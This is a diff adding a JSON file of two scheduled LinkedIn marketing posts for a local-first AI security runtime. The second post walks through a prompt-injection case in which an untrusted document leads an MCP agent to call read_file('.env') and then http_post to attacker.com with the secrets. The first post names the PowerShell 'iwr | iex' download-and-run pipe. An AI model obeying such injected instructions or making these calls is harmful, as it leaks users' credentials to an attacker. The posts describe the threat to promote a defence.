@@ -1,0 +1,21 @@
+{
+  "platform": "linkedin",
+  "campaign_id": "GTM-001-LI",
+  "posts": [
+    {
+      "id": "li-01-ciso-cloud-ban",
+      "target_role": ["CISO", "VP Security", "Head of AI", "CTO"],
+      "scheduled_time": "2026-10-29T13:00:00Z",
+      "utm_link": "https://soterai.in/comparison/prompt-armor?utm_source=linkedin&utm_medium=organic&utm_campaign=sprint01_b2b",
+      "text": "In 2024, the standard approach to AI security was simple: wrap your LLM in a cloud guardrail API.\n\nIn 2026, enterprise security architects are quietly deprecating them.\n\nHere is why:\n\n1. The Data Residency Paradox:\nTo check if a prompt contains proprietary IP or PII, a cloud guardrail requires you to send that exact prompt across the public internet to their servers. In regulated environments (Fintech, Healthcare, Defense), sending raw prompts and RAG contexts to a third-party SaaS violates the exact compliance mandates you’re trying to uphold.\n\n2. The Agent Latency Tax:\nA chatbot handles 1 turn at a time. A 250ms guardrail API delay is noticeable, but tolerable.\nAn autonomous agent makes 15 to 30 tool calls per execution. If every tool call incurs a 300ms round-trip to a cloud guardrail, your agent spends 9 seconds just waiting for permission.\n\n3. The Agent Tool-Execution Blindspot:\nCloud guardrails were designed for text-in, text-out chatbots. They don’t inspect bash executions, Windows PowerShell pipes (iwr | iex), or Model Context Protocol (MCP) tool configurations before they execute.\n\nThat is why we built Soter-AI as a local-first security runtime:\n- Zero network egress: Evaluates 100% inside your VPC or local process memory.\n- Sub-5ms TTFT: Powered by quantized edge ONNX models and deterministic heuristics.\n- Agent-native: Inline firewalls for MCP servers, terminal commands, and synthetic canary tripwires.\n\nIf you are shipping production AI agents, your guardrail belongs in your runtime—not across the internet."
+    },
+    {
+      "id": "li-02-mcp-threat",
+      "target_role": ["Lead AI Architect", "VP Engineering", "DevSecOps Lead"],
+      "scheduled_time": "2026-10-31T14:00:00Z",
+      "utm_link": "https://soterai.in/docs/mcp-tool-security-guide?utm_source=linkedin&utm_medium=organic&utm_campaign=sprint01_b2b",
+      "text": "Anthropic's Model Context Protocol (MCP) is the biggest breakthrough in agentic AI this year.\n\nIt is also one of the most dangerous attack surfaces ever introduced to developer machines.\n\nWhy?\nBecause MCP gives LLMs direct access to your local tools: SQL databases, local file systems, bash shells, and cloud APIs.\n\nHere is an actual attack scenario we reproduced this week:\n1. An agent ingests an untrusted document or GitHub PR containing indirect prompt injection.\n2. The injection instructs the model to call an MCP tool: read_file('.env').\n3. The next instruction calls an external HTTP request tool: http_post(url='https://attacker.com', data=secrets).\n\nIf your security layer is just an LLM prompt or a passive output filter, this attack succeeds 100% of the time.\n\nTo secure MCP agents, you need deterministic pre-execution tool parameter sandboxing, terminal command inspection, and synthetic canary tripwires."
+    }
+  ]
+}
+
